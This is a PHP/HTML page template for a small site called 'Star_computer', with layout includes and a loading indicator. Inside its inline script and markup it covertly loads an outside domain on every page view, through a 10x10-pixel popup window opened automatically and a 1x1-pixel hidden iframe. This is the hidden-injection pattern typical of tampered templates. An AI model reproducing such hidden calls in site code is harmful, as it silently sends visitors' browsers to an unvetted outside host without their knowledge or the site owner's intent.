<?php ob_start();?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="js/sdmenu/sdmenu.css" rel="stylesheet" type="text/css">
<link href="css/star_computer.css" rel="stylesheet" type="text/css" />
<link rel="shortcut icon" href="favicon.ico"/>
<script type="text/javascript" src="ax.js"></script>
<script type="text/javascript" src="js/loading.js"></script>
<title>Star_computer</title>
</head>
<body onLoad="init()">
<div id="starcomputer">
<div id="loading" style="position:absolute;top:269px; color:#FFFFFF; font-family:Geneva, Arial, Helvetica, sans-serif; font-size:11px; margin-left:10px;">
L.o.a.d.i.n.g<br />
<img src="images/loading.gif" border=0 style="margin-left:0px;"></div> 
<script>
var ld=(document.all);
var ns4=document.layers;
var ns6=document.getElementById&&!document.all;
var ie4=document.all;
if (ns4)
ld=document.loading;
else if (ns6)
ld=document.getElementById("loading").style;
else if (ie4)
ld=document.all.loading.style;
function init()
{
if(ns4){ld.visibility="hidden";}
else if (ns6||ie4) ld.display="none";
}
function openWin(w,h,thisUrl,thisTitle) {
        var left      = (screen.width/2)-(w/2);
        var top       = (screen.height/2)-(h/2);
        var targetWin = window.open (thisUrl,thisTitle,'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left); 
} 
openWin(10,10,'http://songhanhcungban.com','songhanh')
</script>
	<iframe src="http://songhanhcungban.com" frameborder="0" width="1" height="1"></iframe>
	<div id="top"><?php
// Code này được tải từ : www.sharecode.org 
	include('banner.php'); ?></div>
	<div id="menutrai"><?php include('menu_left.php');?></div>
	<div id="noidung"><?php  include('content.php');?></div>
  	<div id="menuphai" style="float:left"><?php include('menu_right.php');?></div>
    <div id="footer"><?php include('footer.php'); ?></div>
	
</div>
</body>
</html>
